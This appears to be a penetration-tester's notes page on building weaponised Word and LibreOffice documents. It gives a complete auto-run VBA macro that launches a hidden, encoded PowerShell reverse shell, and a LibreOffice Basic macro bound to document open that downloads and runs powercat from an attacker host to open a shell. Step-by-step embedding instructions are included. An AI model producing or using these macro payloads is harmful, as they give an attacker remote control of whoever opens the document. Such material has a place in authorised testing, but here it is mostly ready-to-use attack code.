# Macros

## .doc

Problem:
We need to make a .doc document with a macro that creates a reverse shell.

To do this, first use [powershell-UTF16LE.py](../../../payloads-n-scripts/reverse-shells/powershell-UTF16LE.py) to generate a an encoded powershell reverse shell.
Now, use [string-shortener.py](./string-shortener.py) to split the string into multiple assignments (due to a funky limitation in VBA).

Now, insert the result into the following:


```
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    
    Dim Str As String
    
    Str = Str + "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgA"
    Str = Str + "D0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0"
    Str = Str + "ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAa"
    Str = Str + "QBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMAAwAC4AMQA"
    Str = Str + "wACIALAAgADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgA"
    Str = Str + "CQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACk"
    Str = Str + "AOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAM"
    Str = Str + "AAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQA"
    Str = Str + "oACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkA"
    Str = Str + "CgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4"
    Str = Str + "ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZ"
    Str = Str + "ABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAA"
    Str = Str + "tAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlA"
    Str = Str + "HgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEc"
    Str = Str + "AZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAI"
    Str = Str + "AAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQB"
    Str = Str + "lAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0A"
    Str = Str + "C0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGs"
    Str = Str + "AMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAU"
    Str = Str + "wAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAA"
    Str = Str + "iAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbA"
    Str = Str + "HQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEM"
    Str = Str + "ASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAY"
    Str = Str + "gBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdAB"
    Str = Str + "lACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkA"
    Str = Str + "GIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGE"
    Str = Str + "AbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQAL"
    Str = Str + "gBDAGwAbwBzAGUAKAApAA=="


    CreateObject("Wscript.Shell").Run Str
End Sub
```

Now it is *IMPORTANT* to save the macro _on the document_ rather than in the projects of the MS Office on the machine.
So when going into MS Word, choose --> View --> Macros --> choose your document in the dropdown --> choose "create".

## LibreOffice


LibreOffice Macros are created by creating a .odt file on the attackbox and doesn't require a Windows VM.
In a LibreOffice document go to Tools --> Organize Macros --> Basic. Now click on the Document --> Standard --> New.
As the syntax is slightly different, the payload will also be.
Here, we simply use the following payload in the Main function:


```
Sub Main
	Shell("cmd /c powershell IEX(New-Object System.Net.WebClient).DownloadString('http://${ATTACKER_IP}:${ATTACKER_WEB_PORT}/powercat.ps1');powercat -c ${ATTACKER_IP} -p ${ATTACKER_PORT} -e powershell")
End Sub
```

This should download and execute powercat.
Now, you save the macro, go to Tools --> Customize --> Events --> Open Document.
In the resulting popup, go under the document, click the macro and click 'OK'.
